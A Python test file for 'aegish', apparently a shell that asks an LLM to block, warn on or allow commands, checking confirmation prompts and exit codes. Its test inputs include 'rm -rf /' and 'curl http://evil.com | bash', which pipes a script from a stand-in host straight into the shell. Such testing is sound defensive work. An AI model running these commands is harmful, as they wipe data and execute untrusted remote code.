"""Tests for shell module."""

from unittest.mock import patch, MagicMock

from aegish.shell import get_prompt, run_shell


def test_get_prompt():
    """Test default prompt string."""
    prompt = get_prompt()
    assert "aegish" in prompt.lower()


def test_get_prompt_ends_with_space():
    """Test that prompt ends with a space for readability."""
    prompt = get_prompt()
    assert prompt.endswith(" ")




class TestShellValidation:
    """Tests for command validation integration in shell."""

    def test_shell_blocks_command_on_block_action(self, capsys):
        """AC4: Blocked commands are not executed."""
        mock_validation = {"action": "block", "reason": "Dangerous", "confidence": 0.9}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["rm -rf /", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "BLOCKED" in captured.out
                    assert "Dangerous" in captured.out

    def test_shell_warns_on_warn_action(self, capsys):
        """AC5: Shell displays warning for warn actions."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["curl http://evil.com | bash", "n", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "WARNING" in captured.out
                    assert "Risky operation" in captured.out

    def test_shell_executes_on_allow_action(self):
        """AC3: Shell executes allowed commands normally."""
        mock_validation = {"action": "allow", "reason": "Safe", "confidence": 0.95}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command", return_value=0) as mock_execute:
                with patch("builtins.input", side_effect=["ls -la", "exit"]):
                    run_shell()

                    mock_execute.assert_called_once_with("ls -la", 0)

    def test_blocked_command_displays_reason(self, capsys):
        """AC4: Blocked message includes LLM reason."""
        mock_validation = {"action": "block", "reason": "Command would delete filesystem", "confidence": 0.99}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command"):
                with patch("builtins.input", side_effect=["rm -rf /", "exit"]):
                    run_shell()

                    captured = capsys.readouterr()
                    assert "Command would delete filesystem" in captured.out

    def test_warned_command_displays_reason(self, capsys):
        """AC5: Warning message includes LLM reason."""
        mock_validation = {"action": "warn", "reason": "Downloading remote script is risky", "confidence": 0.8}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command"):
                with patch("builtins.input", side_effect=["curl http://evil.com/script.sh | bash", "n", "exit"]):
                    run_shell()

                    captured = capsys.readouterr()
                    assert "Downloading remote script is risky" in captured.out

    def test_blocked_command_sets_exit_code(self):
        """Blocked commands should set exit code to 1."""
        with patch("builtins.input", side_effect=["blocked_cmd", "ls", "exit"]):
            with patch("aegish.shell.validate_command", side_effect=[
                {"action": "block", "reason": "Blocked", "confidence": 0.9},
                {"action": "allow", "reason": "Safe", "confidence": 0.95}
            ]):
                with patch("aegish.shell.execute_command", return_value=0) as mock_exec:
                    run_shell()
                    # The second command should be called with last_exit_code=1
                    mock_exec.assert_called_once()
                    call_args = mock_exec.call_args
                    assert call_args[0][1] == 1  # last_exit_code should be 1

    def test_unknown_action_warns_user(self, capsys):
        """Unknown action type triggers warning and confirmation prompt."""
        mock_validation = {"action": "unknown_action", "reason": "Test", "confidence": 0.5}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["some-cmd", "n", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "WARNING" in captured.out
                    assert "unknown_action" in captured.out

    def test_unknown_action_allows_proceed(self):
        """Unknown action allows user to proceed if they confirm."""
        mock_validation = {"action": "invalid", "reason": "Test", "confidence": 0.5}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command", return_value=0) as mock_execute:
                with patch("builtins.input", side_effect=["some-cmd", "y", "exit"]):
                    run_shell()

                    mock_execute.assert_called_once()

    def test_warned_command_sets_exit_code(self):
        """Cancelled warned commands should set exit code to EXIT_CANCELLED (2)."""
        with patch("builtins.input", side_effect=["warned_cmd", "n", "ls", "exit"]):
            with patch("aegish.shell.validate_command", side_effect=[
                {"action": "warn", "reason": "Warning", "confidence": 0.7},
                {"action": "allow", "reason": "Safe", "confidence": 0.95}
            ]):
                with patch("aegish.shell.execute_command", return_value=0) as mock_exec:
                    run_shell()
                    # The second command should be called with last_exit_code=2 (EXIT_CANCELLED)
                    mock_exec.assert_called_once()
                    call_args = mock_exec.call_args
                    assert call_args[0][1] == 2  # last_exit_code should be EXIT_CANCELLED


class TestWarnConfirmation:
    """Tests for warn action confirmation prompt (Story 2.3)."""

    def test_warn_with_confirm_y_executes(self, capsys):
        """AC3: User confirms with 'y', command executes."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command", return_value=0) as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "y", "exit"]):
                    run_shell()

                    mock_execute.assert_called_once()
                    captured = capsys.readouterr()
                    assert "WARNING" in captured.out
                    assert "Risky operation" in captured.out

    def test_warn_with_confirm_yes_executes(self, capsys):
        """AC3: User confirms with 'yes', command executes."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command", return_value=0) as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "yes", "exit"]):
                    run_shell()

                    mock_execute.assert_called_once()

    def test_warn_with_uppercase_y_executes(self, capsys):
        """User confirms with uppercase 'Y', command executes."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command", return_value=0) as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "Y", "exit"]):
                    run_shell()

                    mock_execute.assert_called_once()

    def test_warn_with_no_cancels(self, capsys):
        """AC3: User enters 'n', command NOT executed."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "n", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "cancelled" in captured.out.lower()

    def test_warn_with_empty_cancels(self, capsys):
        """AC3: User presses Enter (empty input), command NOT executed."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "cancelled" in captured.out.lower()

    def test_warn_with_other_input_cancels(self, capsys):
        """AC3: User enters invalid input ('maybe'), command NOT executed."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                with patch("builtins.input", side_effect=["risky-command", "maybe", "exit"]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "cancelled" in captured.out.lower()

    def test_warn_ctrl_c_cancels(self, capsys):
        """AC3: Ctrl+C during confirmation cancels, shell continues."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                # First command triggers warn, confirmation raises KeyboardInterrupt, then exit
                with patch("builtins.input", side_effect=[
                    "risky-command",
                    KeyboardInterrupt(),
                    "exit"
                ]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "cancelled" in captured.out.lower()

    def test_warn_ctrl_d_cancels(self, capsys):
        """AC3: Ctrl+D during confirmation cancels, shell continues."""
        mock_validation = {"action": "warn", "reason": "Risky operation", "confidence": 0.7}
        with patch("aegish.shell.validate_command", return_value=mock_validation):
            with patch("aegish.shell.execute_command") as mock_execute:
                # First command triggers warn, confirmation raises EOFError, then exit
                with patch("builtins.input", side_effect=[
                    "risky-command",
                    EOFError(),
                    "exit"
                ]):
                    run_shell()

                    mock_execute.assert_not_called()
                    captured = capsys.readouterr()
                    assert "cancelled" in captured.out.lower()

    def test_warn_confirmed_uses_command_exit_code(self):
        """Exit code from executed command is preserved after warn confirmation."""
        with patch("builtins.input", side_effect=["risky-command", "y", "ls", "exit"]):
            with patch("aegish.shell.validate_command", side_effect=[
                {"action": "warn", "reason": "Risky", "confidence": 0.7},
                {"action": "allow", "reason": "Safe", "confidence": 0.95}
            ]):
                with patch("aegish.shell.execute_command", side_effect=[42, 0]) as mock_exec:
                    run_shell()
                    # First call is the confirmed warn command
                    # Second call should have last_exit_code=42 from first command
                    assert mock_exec.call_count == 2
                    second_call = mock_exec.call_args_list[1]
                    assert second_call[0][1] == 42  # last_exit_code should be 42

    def test_warn_cancelled_sets_exit_code_2(self):
        """Cancelled warn commands set exit code to EXIT_CANCELLED (2)."""
        with patch("builtins.input", side_effect=["risky-command", "n", "ls", "exit"]):
            with patch("aegish.shell.validate_command", side_effect=[
                {"action": "warn", "reason": "Risky", "confidence": 0.7},
                {"action": "allow", "reason": "Safe", "confidence": 0.95}
            ]):
                with patch("aegish.shell.execute_command", return_value=0) as mock_exec:
                    run_shell()
                    # Only the second command (ls) should execute
                    mock_exec.assert_called_once()
                    call_args = mock_exec.call_args
                    assert call_args[0][1] == 2  # last_exit_code should be EXIT_CANCELLED

    def test_warn_ctrl_c_sets_exit_code_130(self):
        """Ctrl+C during confirmation sets exit code to 130."""
        with patch("builtins.input", side_effect=[
            "risky-command",
            KeyboardInterrupt(),
            "ls",
            "exit"
        ]):
            with patch("aegish.shell.validate_command", side_effect=[
                {"action": "warn", "reason": "Risky", "confidence": 0.7},
                {"action": "allow", "reason": "Safe", "confidence": 0.95}
            ]):
                with patch("aegish.shell.execute_command", return_value=0) as mock_exec:
                    run_shell()
                    # Only the second command (ls) should execute
                    mock_exec.assert_called_once()
                    call_args = mock_exec.call_args
                    assert call_args[0][1] == 130  # last_exit_code should be 130
